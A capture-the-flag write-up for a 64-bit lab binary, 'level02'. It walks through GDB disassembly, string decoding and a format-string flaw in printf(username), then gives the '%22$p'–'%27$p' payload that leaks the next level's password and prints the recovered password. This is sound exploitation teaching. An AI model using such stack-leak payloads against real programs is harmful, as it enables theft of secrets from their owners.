# level02

For now, we only retrieve the `level02` binary and save the GDB disassembly of `main`.

## Connect to level02

Read the password obtained from level01:

```sh
cat level01/flag
```

Connect to the VM:

```sh
ssh level02@127.0.0.1 -p 2222
```

When SSH asks for a password, paste the content of `level01/flag`.

## Get the binary

From the repository root on the host, copy the ELF binary:

```sh
scp -P 2222 level02@127.0.0.1:/home/users/level02/level02 ./level02/level02
```

Use the content of `level01/flag` as the password.

The local binary should now be:

```text
level02/level02
```

## Save `main_dump_gdb`

On the VM, start GDB with the binary loaded:

```sh
gdb ./level02
```

The VM uses GDB 7.4, so use the old logging syntax:

```gdb
set disassembly-flavor intel
set logging file /tmp/main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Verify that the dump exists on the VM:

```sh
ls -l /tmp/main_dump_gdb
```

From the repository root on the host, copy it into `level02`:

```sh
scp -P 2222 level02@127.0.0.1:/tmp/main_dump_gdb ./level02/main_dump_gdb
```

Use the content of `level01/flag` as the password.

The local files for the next analysis step are:

```text
level02/level02
level02/main_dump_gdb
```

## Decode addresses from `main_dump_gdb`

`level02` is a 64-bit ELF. The shared `decode_address.c` supports both ELF32 and ELF64 and can resolve virtual addresses to strings stored in the binary.

Compile it from the repository root:

```sh
gcc -Wall -Wextra -Werror decode_address.c -o decode_address
```

Start with the addresses used before `fopen` and in its error path:

```asm
mov    edx,0x400bb0
mov    eax,0x400bb2
...
call   0x400700 <fopen@plt>
...
mov    eax,0x400bd0
```

Decode them:

```sh
./decode_address level02/level02 0x400bb0
./decode_address level02/level02 0x400bb2
./decode_address level02/level02 0x400bd0
./decode_address level02/level02 0x400bf5
./decode_address level02/level02 0x400bf8
```

Output:

```text
0x0000000000400bb0 (file offset 0xbb0): "r"
0x0000000000400bb2 (file offset 0xbb2): "/home/users/level03/.pass"
0x0000000000400bd0 (file offset 0xbd0): "ERROR: failed to open password file\n"
0x0000000000400bf5 (file offset 0xbf5): "\n"
0x0000000000400bf8 (file offset 0xbf8): "ERROR: failed to read password file\n"
```

This shows that `main` opens `/home/users/level03/.pass` in read mode and reads its content into a local buffer.

Decode the remaining display and command strings:

```sh
./decode_address level02/level02 0x400c20
./decode_address level02/level02 0x400c50
./decode_address level02/level02 0x400c80
./decode_address level02/level02 0x400cb0
./decode_address level02/level02 0x400cd9
./decode_address level02/level02 0x400ce8
./decode_address level02/level02 0x400cf8
./decode_address level02/level02 0x400d22
./decode_address level02/level02 0x400d32
./decode_address level02/level02 0x400d3a
```

Important results:

```text
0x0000000000400cd9: "--[ Username: "
0x0000000000400ce8: "--[ Password: "
0x0000000000400d22: "Greetings, %s!\n"
0x0000000000400d32: "/bin/sh"
0x0000000000400d3a: " does not have access!"
```

Do not pass PLT call targets such as `0x400700 <fopen@plt>` to the decoder as strings. Those addresses point to executable code, not string data.

## Follow the password comparison

`main_dump_gdb` reads the content of `/home/users/level03/.pass` into the local buffer at `rbp - 0xa0`:

```asm
lea    rax,[rbp-0xa0]
mov    edx,0x29
mov    esi,0x1
mov    rdi,rax
call   0x400690 <fread@plt>
```

Later, it compares `0x29` bytes of that secret buffer with the entered password at `rbp - 0x110`:

```asm
lea    rcx,[rbp-0x110]
lea    rax,[rbp-0xa0]
mov    edx,0x29
mov    rsi,rcx
mov    rdi,rax
call   0x400670 <strncmp@plt>
```

So the entered password must match the 41 bytes read from the level03 password file.

## Find the format-string vulnerability

When the password comparison fails, `main` prints the username like this:

```asm
lea    rax,[rbp-0x70]
mov    rdi,rax
mov    eax,0x0
call   0x4006c0 <printf@plt>
```

The username is passed directly as the first argument to `printf` instead of being passed through a fixed format such as `"%s"`:

```c
printf(username);       /* vulnerable */
printf("%s", username); /* safe form */
```

This allows format specifiers entered as the username to read values from the stack.

## Locate the secret on the stack

The value `22` comes from the stack layout and the x86-64 calling convention.

At the start of `main`, the function reserves `0x120` bytes:

```asm
push   rbp
mov    rbp,rsp
sub    rsp,0x120
```

Therefore, while `main` is running:

```text
rsp = rbp - 0x120
```

The secret read from `/home/users/level03/.pass` starts at:

```text
rbp - 0xa0
```

The distance from the start of the local stack area to the secret is:

```text
(rbp - 0xa0) - (rbp - 0x120) = 0x80 bytes
```

One `%p` reads one 64-bit value, which is eight bytes:

```text
0x80 / 8 = 16 stack values
```

For a variadic x86-64 function such as `printf`, the first five values after the format string are read from registers:

```text
%1$p -> rsi
%2$p -> rdx
%3$p -> rcx
%4$p -> r8
%5$p -> r9
```

The first value read from the caller's stack is therefore `%6$p`. The secret is 16 stack slots after that starting position:

```text
6 + 16 = 22
```

That is why the first test uses:

```text
%22$p
```

The calculation identifies the expected offset; running the program confirms whether the actual stack layout matches it.

Connect to the VM and test:

```sh
./level02
```

Use this username:

```text
%22$p
```

Use any incorrect password, for example:

```text
test
```

If the offset is correct, the failure output prints a hexadecimal value from the start of the secret buffer.

To leak the full 41-byte value, request six consecutive 64-bit words:

```text
%22$p %23$p %24$p %25$p %26$p %27$p
```

Each printed value represents eight bytes in little-endian order. The bytes of each word must therefore be reversed when reconstructing the password string.

For example, the first test produced:

```text
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
--[ Username: %22$p
--[ Password: test
*****************************************
0x756e505234376848 does not have access!
```

The hexadecimal value contains these bytes:

```text
75 6e 50 52 34 37 68 48
```

Because the machine stores the 64-bit value in little-endian order, reverse the bytes before converting them to ASCII:

```text
48 68 37 34 52 50 6e 75
 H  h  7  4  R  P  n  u
```

The first eight characters of the secret are therefore:

```text
Hh74RPnu
```

Repeat this conversion for `%23$p` through `%27$p`, then concatenate all the decoded blocks in order. Ignore any null bytes after the end of the 41-byte secret.

The remaining leaks are:

```text
%23$p -> 0x45414a3561733951 -> Q9sa5JAE
%24$p -> 0x377a7143574e6758 -> XgNWCqz7
%25$p -> 0x354a35686e475873 -> sXGnh5J5
%26$p -> 0x48336750664b394d -> M9KfPg3H
%27$p -> 0xfeff00
```

Together with the first block, the decoded 40-character password is:

```text
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

The `%27$p` value is not part of the password. The program asks `fread` for `0x29` bytes because the password file contains the 40-character password followed by a newline.

Use the recovered password to connect to the next level:

```sh
ssh level03@127.0.0.1 -p 2222
```
